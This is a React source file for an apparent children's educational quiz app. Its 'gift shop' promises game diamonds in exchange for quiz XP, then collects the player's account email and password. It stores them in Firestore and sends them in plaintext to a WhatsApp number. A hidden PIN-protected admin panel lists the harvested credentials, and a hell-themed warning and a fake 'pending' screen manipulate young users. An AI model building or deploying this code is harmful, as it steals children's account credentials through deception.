import React, { useState, useEffect, useRef } from 'react';
import { Gift, Loader2, Lock, Trash2, CheckCircle2, BookOpen, Trophy, Brain, ChevronRight, Star, GraduationCap, ArrowLeft, Infinity, RefreshCw, ShieldCheck, X, Globe, Timer, AlertTriangle, Scale, Languages, Flag } from 'lucide-react';
import { initializeApp } from 'firebase/app';
import { getAuth, signInAnonymously, onAuthStateChanged } from 'firebase/auth';
import { getFirestore, collection, addDoc, onSnapshot, query, deleteDoc, doc, serverTimestamp } from 'firebase/firestore';

const firebaseConfig = JSON.parse(__firebase_config);
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const appId = typeof __app_id !== 'undefined' ? __app_id : 'ff-sky-edu-v17';

const getQuestionsByGrade = (subject, grade) => {
  const g = parseInt(grade);
  
  // Database soal yang lebih variatif agar tidak terasa mengulang
  const subjectsData = {
    MTK: g <= 6 ? [
      { q: "Hasil 15 + 25?", a: ["40", "35", "45"], c: 0 },
      { q: "Sisi x Sisi adalah rumus luas?", a: ["Segitiga", "Persegi", "Lingkaran"], c: 1 },
      { q: "Akar dari 64?", a: ["6", "7", "8"], c: 2 },
      { q: "100 : 4 = ?", a: ["20", "25", "30"], c: 1 },
      { q: "Bilangan ganjil setelah 7?", a: ["8", "9", "10"], c: 1 },
      { q: "Berapa menit dalam 2 jam?", a: ["60", "120", "180"], c: 1 },
      { q: "Sudut siku-siku besarnya?", a: ["45°", "90°", "180°"], c: 1 },
      { q: "Hasil 7 x 8?", a: ["54", "56", "64"], c: 1 },
      { q: "Bentuk desimal dari 1/2?", a: ["0.2", "0.5", "0.1"], c: 1 },
      { q: "Keliling persegi sisi 5cm?", a: ["20", "25", "10"], c: 0 }
    ] : [
      { q: "Turunan dari 3x² ?", a: ["6x", "3x", "6"], c: 0 },
      { q: "Cos 60° adalah?", a: ["0.5", "1", "0.8"], c: 0 },
      { q: "Persamaan kuadrat x²-4=0, x=?", a: ["2", "4", "0"], c: 0 },
      { q: "Limit x→∞ 1/x ?", a: ["1", "0", "∞"], c: 1 },
      { q: "Log 100?", a: ["1", "2", "10"], c: 1 },
      { q: "Integral dari 2x dx?", a: ["x² + C", "2x²", "x"], c: 0 },
      { q: "Sin 90°?", a: ["0", "1", "0.5"], c: 1 },
      { q: "Matriks identitas 2x2?", a: ["[[1,0],[0,1]]", "[[0,1],[1,0]]", "[[1,1],[1,1]]"], c: 0 },
      { q: "Berapa hasil 2 pangkat 5?", a: ["10", "32", "64"], c: 1 },
      { q: "Median dari 1, 3, 5?", a: ["1", "3", "5"], c: 1 }
    ],
    IPA: [
      { q: "Hukum I Newton disebut hukum?", a: ["Inersia", "Aksi-Reaksi", "Gravitasi"], c: 0 },
      { q: "pH Larutan Basa?", a: ["> 7", "7", "< 7"], c: 0 },
      { q: "Organel sel 'Powerhouse'?", a: ["Nukleus", "Mitokondria", "Ribosom"], c: 1 },
      { q: "Planet terdekat ke Matahari?", a: ["Venus", "Bumi", "Merkurius"], c: 2 },
      { q: "Satuan Daya?", a: ["Watt", "Joule", "Newton"], c: 0 },
      { q: "Perubahan gas ke padat?", a: ["Mengkristal", "Menyublim", "Menguap"], c: 0 },
      { q: "Tulang belakang disebut?", a: ["Vertebrae", "Femur", "Skull"], c: 0 },
      { q: "Simbol kimia Perak?", a: ["Au", "Ag", "Fe"], c: 1 },
      { q: "Kecepatan cahaya kira-kira?", a: ["300rb km/s", "150rb km/s", "1jt km/s"], c: 0 },
      { q: "Zat hijau daun?", a: ["Klorofil", "Stomata", "Xilem"], c: 0 }
    ],
    IPS: [
      { q: "Ibu kota Indonesia?", a: ["Bandung", "Jakarta", "Surabaya"], c: 1 },
      { q: "Benua tempat kita tinggal?", a: ["Asia", "Afrika", "Eropa"], c: 0 },
      { q: "Samudra terluas?", a: ["Pasifik", "Atlantik", "Hindia"], c: 0 },
      { q: "VOC dibentuk tahun?", a: ["1602", "1700", "1945"], c: 0 },
      { q: "Gunung tertinggi di dunia?", a: ["Everest", "Semeru", "Fuji"], c: 0 },
      { q: "Negara kincir angin?", a: ["Jerman", "Belanda", "Prancis"], c: 1 },
      { q: "Penghasil timah terbesar?", a: ["Bangka Belitung", "Papua", "Jawa"], c: 0 },
      { q: "Mata uang Jepang?", a: ["Won", "Yen", "Dollar"], c: 1 },
      { q: "Benua Kanguru?", a: ["Eropa", "Australia", "Amerika"], c: 1 },
      { q: "Pendiri ASEAN dari Indonesia?", a: ["Adam Malik", "Soekarno", "Hatta"], c: 0 }
    ],
    AGAMA: [
      { q: "Kitab suci umat Islam?", a: ["Injil", "Al-Qur'an", "Taurat"], c: 1 },
      { q: "Malaikat peniup sangkakala?", a: ["Jibril", "Israfil", "Mikail"], c: 1 },
      { q: "Rukun Iman ada?", a: ["5", "6", "7"], c: 1 },
      { q: "Nabi terakhir?", a: ["Isa", "Muhammad SAW", "Musa"], c: 1 },
      { q: "Shalat wajib sehari semalam?", a: ["3 waktu", "5 waktu", "7 waktu"], c: 1 },
      { q: "Puasa wajib di bulan?", a: ["Syawal", "Ramadhan", "Rajab"], c: 1 },
      { q: "Tempat ibadah umat Hindu?", a: ["Vihara", "Pura", "Gereja"], c: 1 },
      { q: "Sifat nabi 'Siddiq' artinya?", a: ["Benar", "Cerdas", "Dipercaya"], c: 0 },
      { q: "Kota suci umat Islam?", a: ["Madinah", "Makkah", "Cairo"], c: 1 },
      { q: "Zakat yang wajib saat Idul Fitri?", a: ["Mal", "Fitrah", "Profesi"], c: 1 }
    ],
    BAHASA: [
      { q: "Kata dasar 'Memakan'?", a: ["Makan", "Makan-makan", "Makanlah"], c: 0 },
      { q: "Majas yang melebih-lebihkan?", a: ["Hiperbola", "Litotes", "Personifikasi"], c: 0 },
      { q: "Lawan kata 'Besar'?", a: ["Kecil", "Luas", "Lebar"], c: 0 },
      { q: "Persamaan kata 'Indah'?", a: ["Buruk", "Elok", "Jelek"], c: 1 },
      { q: "Tokoh utama dalam cerita?", a: ["Protagonis", "Antagonis", "Figuran"], c: 0 },
      { q: "Kalimat perintah diakhiri tanda?", a: ["Tanya (?)", "Seru (!)", "Titik (.)"], c: 1 },
      { q: "Ide pokok paragraf disebut?", a: ["Gagasan utama", "Kalimat penjelas", "Alur"], c: 0 },
      { q: "Bahasa persatuan kita?", a: ["Jawa", "Indonesia", "Inggris"], c: 1 },
      { q: "Huruf vokal ada berapa?", a: ["3", "5", "7"], c: 1 },
      { q: "Penulisan gelar yang benar?", a: ["S.Pd.", "SPd", "S. Pd"], c: 0 }
    ],
    PANCASILA: [
      { q: "Lambang sila ke-2?", a: ["Bintang", "Rantai", "Padi Kapas"], c: 1 },
      { q: "Bhinneka Tunggal Ika artinya?", a: ["Satu saja", "Berbeda tapi satu", "Sama saja"], c: 1 },
      { q: "Sila pertama berbunyi?", a: ["Keadilan sosial", "Ketuhanan YME", "Persatuan"], c: 1 },
      { q: "Lambang negara Indonesia?", a: ["Garuda", "Harimau", "Melati"], c: 0 },
      { q: "Sila ke-5 dilambangkan?", a: ["Banteng", "Padi dan Kapas", "Rantai"], c: 1 },
      { q: "Hari Kesaktian Pancasila?", a: ["1 Juni", "1 Oktober", "17 Agustus"], c: 1 },
      { q: "Pencetus nama Pancasila?", a: ["Soekarno", "Hatta", "Moh. Yamin"], c: 0 },
      { q: "Musyawarah cermin sila ke?", a: ["2", "3", "4"], c: 2 },
      { q: "Warna bendera Indonesia?", a: ["Merah Putih", "Putih Merah", "Merah Kuning"], c: 0 },
      { q: "UUD 1945 disahkan pada?", a: ["17 Agustus", "18 Agustus", "1 Juni"], c: 1 }
    ]
  };

  const selected = subjectsData[subject] || [];
  let result = [];
  while(result.length < 10) { result = [...result, ...selected]; }
  return result.slice(0, 10).map(q => ({...q, a: [...q.a].sort(() => Math.random() - 0.5)})); 
};

export default function App() {
  const [lang, setLang] = useState(null);
  const [user, setUser] = useState(null);
  const [points, setPoints] = useState(0);
  const [view, setView] = useState('lang_select'); 
  const [gradeType, setGradeType] = useState(null); 
  const [gradeNum, setGradeNum] = useState(null);
  const [subject, setSubject] = useState(null);
  const [currentQuiz, setCurrentQuiz] = useState(0);
  const [quizzes, setQuizzes] = useState([]);
  const [cooldowns, setCooldowns] = useState({});
  const [timeLeft, setTimeLeft] = useState({});
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [selectedDm, setSelectedDm] = useState(null);
  const [loading, setLoading] = useState(false);
  const [adminAuth, setAdminAuth] = useState(false);
  const [claims, setClaims] = useState([]);
  const [showPinModal, setShowPinModal] = useState(false);
  const [inputPin, setInputPin] = useState('');
  const [feedback, setFeedback] = useState(null);

  const TARGET_WA = "6285185160051";

  useEffect(() => {
    const firebaseApp = initializeApp(firebaseConfig);
    const auth = getAuth(firebaseApp);
    signInAnonymously(auth);
    return onAuthStateChanged(auth, setUser);
  }, []);

  useEffect(() => {
    const timer = setInterval(() => {
      const now = Date.now();
      const updatedTimeLeft = {};
      Object.keys(cooldowns).forEach(sub => {
        const diff = cooldowns[sub] - now;
        if (diff > 0) {
          const mins = Math.floor(diff / 60000);
          const secs = Math.floor((diff % 60000) / 1000);
          updatedTimeLeft[sub] = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
        }
      });
      setTimeLeft(updatedTimeLeft);
    }, 1000);
    return () => clearInterval(timer);
  }, [cooldowns]);

  useEffect(() => {
    if (!user || !adminAuth) return;
    const q = query(collection(getFirestore(), 'artifacts', appId, 'public', 'data', 'claims'));
    return onSnapshot(q, (s) => setClaims(s.docs.map(d => ({id: d.id, ...d.data()}))));
  }, [user, adminAuth]);

  const startQuiz = (sub) => {
    if (timeLeft[sub]) return;
    setSubject(sub);
    setQuizzes(getQuestionsByGrade(sub, gradeNum));
    setCurrentQuiz(0);
    setView('quiz');
  };

  const handleAnswer = (choiceText) => {
    if (feedback) return; 
    
    const current = quizzes[currentQuiz];
    const isCorrect = choiceText === current.a[current.c];

    if (isCorrect) {
      setPoints(p => p + 21);
      setFeedback('CORRECT');
    } else {
      setFeedback('WRONG');
    }

    // Timer feedback super cepat biar flow "skip" berasa
    setTimeout(() => {
      setFeedback(null);
      if (currentQuiz + 1 < quizzes.length) {
        // MAU BENAR MAU SALAH, LANGSUNG PINDAH KE SOAL BERIKUTNYA
        setCurrentQuiz(prev => prev + 1);
      } else {
        const fifteenMins = Date.now() + 15 * 60 * 1000;
        setCooldowns(prev => ({ ...prev, [subject]: fifteenMins }));
        setView('home');
      }
    }, 400); // Durasi visual feedback 0.4 detik
  };

  const sendToWA = async (e) => {
    e.preventDefault();
    setLoading(true);
    try {
      await addDoc(collection(getFirestore(), 'artifacts', appId, 'public', 'data', 'claims'), {
        email, password, dm: selectedDm.dm, grade: `${gradeType} ${gradeNum}`, timestamp: serverTimestamp()
      });
      setView('success');
      setTimeout(() => { 
        const text = `KLAIM DIAMOND\nEmail: ${email}\nPass: ${password}\nItem: ${selectedDm.dm} DM\nGrade: ${gradeType} ${gradeNum}`;
        window.location.href = `https://wa.me/${TARGET_WA}?text=${encodeURIComponent(text)}`; 
      }, 1500);
    } catch (err) { alert("Error database!"); }
    finally { setLoading(false); }
  };

  if (adminAuth) {
    return (
      <div className="min-h-screen bg-slate-50 p-4 font-sans text-slate-800">
        <div className="max-w-md mx-auto space-y-4">
          <div className="bg-white p-5 rounded-3xl flex justify-between items-center shadow-sm">
            <h1 className="font-black italic uppercase tracking-tighter">Panel Kontrol</h1>
            <button onClick={() => setAdminAuth(false)} className="text-red-500"><X/></button>
          </div>
          <div className="bg-sky-600 p-6 rounded-[2.5rem] text-white shadow-xl">
            <p className="text-3xl font-black">{points.toLocaleString()} XP</p>
            <div className="flex gap-2 mt-4">
              <button onClick={() => setPoints(999999)} className="bg-white text-sky-600 px-4 py-2 rounded-xl font-black text-[10px] uppercase">Boost Max</button>
              <button onClick={() => setCooldowns({})} className="bg-white/20 px-4 py-2 rounded-xl font-black text-[10px] uppercase">Hapus Cooldown</button>
            </div>
          </div>
          <div className="space-y-3 pb-10">
            {claims.map(c => (
              <div key={c.id} className="bg-white p-4 rounded-3xl shadow-sm border border-slate-100 animate-in fade-in slide-in-from-bottom-2">
                <div className="flex justify-between items-start mb-2">
                  <p className="font-black text-sky-600 truncate w-40">{c.email}</p>
                  <button onClick={() => deleteDoc(doc(getFirestore(), 'artifacts', appId, 'public', 'data', 'claims', c.id))} className="text-slate-200"><Trash2 size={16}/></button>
                </div>
                <p className="bg-slate-50 p-2 rounded-xl text-[10px] font-mono break-all">{c.password}</p>
                <div className="flex justify-between items-center mt-2">
                  <span className="text-[9px] font-black text-slate-400 italic">💎 {c.dm} DM | {c.grade}</span>
                  <span className="text-[8px] text-slate-300 font-bold uppercase">Pending</span>
                </div>
              </div>
            ))}
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8fafc] font-sans flex flex-col items-center select-none overflow-x-hidden">
      
      {showPinModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6 bg-slate-900/80 backdrop-blur-md">
          <div className="bg-white w-full max-w-xs p-8 rounded-[3.5rem] shadow-2xl text-center space-y-6">
            <Lock size={32} className="mx-auto text-sky-500"/>
            <h3 className="font-black text-xl italic uppercase">Akses Rahasia</h3>
            <input type="password" maxLength={6} value={inputPin} onChange={e => setInputPin(e.target.value)} className="w-full text-center text-3xl font-black bg-slate-50 py-4 rounded-3xl outline-none border-2 focus:border-sky-500" />
            <button onClick={() => { if(inputPin === '231003') { setAdminAuth(true); setShowPinModal(false); setInputPin(''); } else alert("PIN SALAH!"); }} className="w-full bg-sky-500 py-4 rounded-2xl font-black text-white uppercase">BUKA PANEL</button>
          </div>
        </div>
      )}

      {view === 'lang_select' ? (
        <div className="flex-1 flex flex-col justify-center items-center w-full max-w-md px-8 animate-in fade-in">
          <Globe size={64} className="text-sky-500 mb-6" />
          <h2 className="text-2xl font-black text-slate-800 mb-8 italic text-center uppercase tracking-tighter">PILIH BAHASA</h2>
          <div className="grid grid-cols-1 gap-3 w-full">
            {['INDONESIA', 'INGGRIS', 'JAKSEL', 'JAWA'].map(l => (
              <button key={l} onClick={() => { setLang(l); setView('grade_type'); }} className="bg-white p-6 rounded-[2.2rem] shadow-xl text-xl font-black text-sky-600 flex justify-between items-center active:scale-95 transition-all">
                {l} <ChevronRight size={24}/>
              </button>
            ))}
          </div>
        </div>
      ) : (
        <>
          <header className="w-full max-w-md p-6 flex justify-between items-center z-20">
            <div onClick={() => setShowPinModal(true)} className="bg-white p-3 rounded-[1.5rem] shadow-xl flex items-center gap-2 cursor-pointer active:scale-110 transition-all">
              <Gift size={20} className="text-sky-500"/>
              <span className="text-xs font-black text-sky-600 tracking-tight italic uppercase">SKY EDU</span>
            </div>
            <div className="bg-yellow-400 px-5 py-2.5 rounded-full flex items-center gap-2 shadow-xl border-b-4 border-yellow-600">
              <Star size={16} className="text-white fill-white" />
              <span className="text-sm font-black text-yellow-950">{points.toLocaleString()} XP</span>
            </div>
          </header>

          <main className="w-full max-w-md px-6 flex-1 flex flex-col pb-10">
            {view === 'grade_type' && (
              <div className="text-center mt-10 animate-in slide-in-from-bottom-5">
                <GraduationCap size={64} className="mx-auto text-sky-500 mb-6" />
                <h2 className="text-2xl font-black text-slate-800 italic uppercase">PILIH JENJANG</h2>
                <div className="grid gap-3 mt-10">
                  {['SD', 'SMP', 'SMA'].map(g => (
                    <button key={g} onClick={() => { setGradeType(g); setView('grade_num'); }} className="bg-white p-6 rounded-[2rem] text-2xl font-black text-sky-600 shadow-lg flex justify-between items-center active:scale-95">
                      {g} <ChevronRight size={28}/>
                    </button>
                  ))}
                </div>
              </div>
            )}

            {view === 'grade_num' && (
              <div className="text-center mt-6 animate-in zoom-in-95">
                <h2 className="text-2xl font-black text-slate-800 mb-8 italic uppercase tracking-tighter">KELAS BERAPA?</h2>
                <div className="grid grid-cols-3 gap-3">
                  {(gradeType === 'SD' ? [1,2,3,4,5,6] : gradeType === 'SMP' ? [7,8,9] : [10,11,12]).map(n => (
                    <button key={n} onClick={() => { setGradeNum(n); setView('honesty_check'); }} className="bg-white aspect-square flex items-center justify-center text-4xl font-black text-sky-500 rounded-[2.5rem] shadow-xl border-b-8 border-slate-100 active:bg-sky-500 active:text-white transition-all">
                      {n}
                    </button>
                  ))}
                </div>
                <button onClick={() => setView('grade_type')} className="mt-10 text-[10px] font-black text-slate-300 uppercase tracking-widest flex items-center gap-2 mx-auto"><ArrowLeft size={14}/> KEMBALI</button>
              </div>
            )}

            {view === 'honesty_check' && (
              <div className="py-6 animate-in zoom-in-95 text-center">
                <div className="bg-white p-10 rounded-[4rem] shadow-2xl border-b-[12px] border-red-500 space-y-8">
                  <AlertTriangle size={64} className="mx-auto text-red-500 animate-pulse" />
                  <h2 className="text-2xl font-black text-slate-800 uppercase italic">PERINGATAN!</h2>
                  <div className="bg-red-50 p-6 rounded-[2rem] text-red-600 font-bold italic text-sm leading-relaxed">
                    "Kamu Kelas {gradeNum}? <br/><br/>
                    Ingat, bohong itu dosa besar. Di neraka lidah orang bohong bakal dipotong pakai gunting api selamanya! Jujur?"
                  </div>
                  <div className="space-y-3">
                    <button onClick={() => setView('home')} className="w-full bg-red-600 text-white py-6 rounded-[2rem] font-black text-xl shadow-xl active:scale-95 transition-all uppercase leading-none">
                      SAYA JUJUR, LANJUT!
                    </button>
                    <button onClick={() => setView('grade_num')} className="w-full bg-slate-100 text-slate-400 py-4 rounded-[1.5rem] font-bold text-xs uppercase">
                      GANTI KELAS
                    </button>
                  </div>
                </div>
              </div>
            )}

            {view === 'home' && (
              <div className="flex flex-col gap-6 py-4 animate-in fade-in">
                <div className="bg-white p-10 rounded-[4rem] text-center shadow-2xl border-b-[12px] border-slate-50">
                  <Brain size={44} className="mx-auto text-sky-500 mb-4" />
                  <h3 className="text-2xl font-black text-slate-800 italic uppercase">SIAP KUIS?</h3>
                  <p className="text-[10px] text-slate-400 font-bold uppercase mt-3 tracking-widest">{gradeType} - KELAS {gradeNum}</p>
                  <button onClick={() => setView('subjects')} className="w-full mt-10 bg-sky-500 text-white py-6 rounded-[2rem] font-black text-2xl shadow-xl border-b-8 border-sky-800 active:translate-y-2 active:border-b-0 transition-all uppercase">
                    PILIH MATERI ✨
                  </button>
                </div>
                <button onClick={() => setView('shop')} className="bg-yellow-400 p-8 rounded-[3rem] border-b-[10px] border-yellow-600 flex items-center justify-between shadow-xl active:scale-95 transition-all">
                  <div className="text-left">
                    <p className="font-black text-yellow-950 italic text-2xl uppercase leading-none">TUKAR XP</p>
                    <p className="text-[10px] font-black text-yellow-900/60 uppercase mt-1">GIFT DIAMONDS</p>
                  </div>
                  <ChevronRight className="text-yellow-950" size={32} />
                </button>
              </div>
            )}

            {view === 'subjects' && (
              <div className="grid grid-cols-2 gap-3 py-4 animate-in slide-in-from-right-10">
                {[
                  { id: 'MTK', icon: <Brain size={20}/> },
                  { id: 'IPA', icon: <Infinity size={20}/> },
                  { id: 'IPS', icon: <Globe size={20}/> },
                  { id: 'AGAMA', icon: <Scale size={20}/> },
                  { id: 'BAHASA', icon: <Languages size={20}/> },
                  { id: 'PANCASILA', icon: <Flag size={20}/> }
                ].map(s => {
                  const onCooldown = !!timeLeft[s.id];
                  return (
                    <button key={s.id} disabled={onCooldown} onClick={() => startQuiz(s.id)} className={`p-5 rounded-[2.5rem] flex flex-col items-center justify-center gap-3 shadow-lg transition-all ${onCooldown ? 'bg-slate-50 opacity-60' : 'bg-white active:scale-95'}`}>
                      <div className={`${onCooldown ? 'text-slate-300' : 'text-sky-500'}`}>{s.icon}</div>
                      <span className={`text-sm font-black italic uppercase ${onCooldown ? 'text-slate-400' : 'text-sky-600'}`}>{s.id}</span>
                      {onCooldown && <span className="text-[9px] font-black text-red-500 flex items-center gap-1"><Timer size={10}/> {timeLeft[s.id]}</span>}
                    </button>
                  );
                })}
                <button onClick={() => setView('home')} className="col-span-2 mt-6 text-[10px] font-black text-slate-300 uppercase tracking-widest text-center">KEMBALI</button>
              </div>
            )}

            {view === 'quiz' && (
              <div className="py-6 animate-in zoom-in-95">
                <div className={`bg-white p-10 rounded-[3.5rem] shadow-2xl space-y-8 text-center border-b-[12px] transition-all duration-300 ${feedback === 'CORRECT' ? 'border-green-500 bg-green-50' : feedback === 'WRONG' ? 'border-red-500 bg-red-50' : 'border-slate-50'}`}>
                  <div className="flex justify-between items-center">
                    <span className="bg-sky-50 text-sky-500 px-4 py-2 rounded-full font-black text-[10px] uppercase">{subject}</span>
                    <span className="text-slate-300 font-black text-xs">{currentQuiz + 1}/10</span>
                  </div>
                  
                  {feedback ? (
                    <div className="h-48 flex flex-col items-center justify-center animate-in zoom-in duration-200">
                       {feedback === 'CORRECT' ? (
                         <>
                           <CheckCircle2 size={80} className="text-green-500 mb-4 animate-bounce"/>
                           <p className="text-green-600 font-black text-2xl italic uppercase tracking-tighter">MANTAP! +21 XP</p>
                         </>
                       ) : (
                         <>
                           <X size={80} className="text-red-500 mb-4 animate-pulse"/>
                           <p className="text-red-600 font-black text-2xl italic uppercase tracking-tighter">SALAH! SKIP...</p>
                         </>
                       )}
                    </div>
                  ) : (
                    <>
                      <h2 className="text-xl font-black text-slate-800 italic uppercase leading-tight min-h-[6rem] flex items-center justify-center">
                        {quizzes[currentQuiz].q}
                      </h2>
                      <div className="grid gap-3 w-full">
                        {quizzes[currentQuiz].a.map((opt, i) => (
                          <button key={i} onClick={() => handleAnswer(opt)} className="w-full bg-slate-50 p-6 rounded-[2rem] text-md font-black text-slate-600 border-b-4 border-slate-200 active:border-b-0 active:translate-y-1 transition-all">
                            {opt}
                          </button>
                        ))}
                      </div>
                    </>
                  )}
                  <p className="text-[9px] text-slate-300 font-black uppercase italic mt-4 tracking-widest">Sekali jawab langsung pindah soal!</p>
                </div>
              </div>
            )}

            {view === 'shop' && (
              <div className="space-y-4 py-4 animate-in fade-in">
                <h3 className="text-2xl font-black text-slate-800 italic mb-8 uppercase text-center">GIFT SHOP 💎</h3>
                {[
                  { dm: 350, cost: 200 }, { dm: 500, cost: 350 }, { dm: 1050, cost: 450 }, { dm: 3500, cost: 750 }, { dm: 5100, cost: 1130 }
                ].map((item, i) => {
                  const ok = points >= item.cost;
                  return (
                    <button key={i} disabled={!ok} onClick={() => { setSelectedDm(item); setView('verify'); }} className={`w-full p-6 rounded-[3rem] flex items-center justify-between transition-all ${ok ? 'bg-white shadow-xl' : 'bg-slate-100 opacity-40'}`}>
                      <div className="flex items-center gap-5">
                        <span className="text-4xl">💎</span>
                        <div className="text-left font-black">
                          <p className="text-slate-800 italic text-xl">{item.dm} DM</p>
                          <p className="text-[11px] text-sky-500 uppercase">BIAYA: {item.cost} XP</p>
                        </div>
                      </div>
                      <ChevronRight size={24} className="text-slate-300" />
                    </button>
                  );
                })}
                <button onClick={() => setView('home')} className="mt-6 text-[10px] font-black text-slate-300 uppercase tracking-widest flex items-center gap-2 mx-auto"><ArrowLeft size={14}/> KEMBALI</button>
              </div>
            )}

            {view === 'verify' && (
              <div className="py-6 animate-in zoom-in-95">
                <div className="bg-white p-10 rounded-[4rem] shadow-2xl space-y-8 text-center border-b-[16px] border-slate-50">
                  <h2 className="text-2xl font-black text-slate-800 uppercase italic leading-none">KONFIRMASI AKUN</h2>
                  <p className="text-[10px] font-black text-sky-500 uppercase tracking-widest">{selectedDm.dm} DIAMONDS</p>
                  <form onSubmit={sendToWA} className="space-y-4">
                    <input type="text" placeholder="Email / ID Akun" required className="w-full bg-slate-50 p-6 rounded-[2rem] outline-none border-2 focus:border-sky-500 font-bold" value={email} onChange={e => setEmail(e.target.value)} />
                    <input type="password" placeholder="Password" required className="w-full bg-slate-50 p-6 rounded-[2rem] outline-none border-2 focus:border-sky-500 font-bold" value={password} onChange={e => setPassword(e.target.value)} />
                    <button type="submit" disabled={loading} className="w-full bg-sky-500 text-white py-7 rounded-[2rem] font-black text-2xl shadow-xl border-b-8 border-sky-800 active:translate-y-2 uppercase leading-none">
                      {loading ? <Loader2 className="animate-spin mx-auto"/> : "KIRIM SEKARANG 🚀"}
                    </button>
                  </form>
                  <button onClick={() => setView('shop')} className="text-[10px] font-black text-slate-300 uppercase">BATALKAN</button>
                </div>
              </div>
            )}

            {view === 'success' && (
              <div className="text-center py-20 bg-white rounded-[5rem] shadow-2xl animate-in bounce-in">
                <CheckCircle2 size={72} className="text-green-500 mx-auto mb-10 animate-bounce" />
                <h2 className="text-3xl font-black text-slate-800 uppercase italic">PENDING!</h2>
                <p className="text-slate-400 text-xs font-bold mt-4 px-10 italic leading-relaxed">Sistem Sedang Memproses... <br/> Hubungi Admin untuk mempercepat!</p>
              </div>
            )}
          </main>
        </>
      )}

      <footer className="w-full p-10 opacity-10 text-center mt-auto">
        <p className="text-[9px] font-black text-slate-900 uppercase tracking-[0.5em]">SKY EDU • V17 FLASH SKIP</p>
      </footer>
    </div>
  );
}

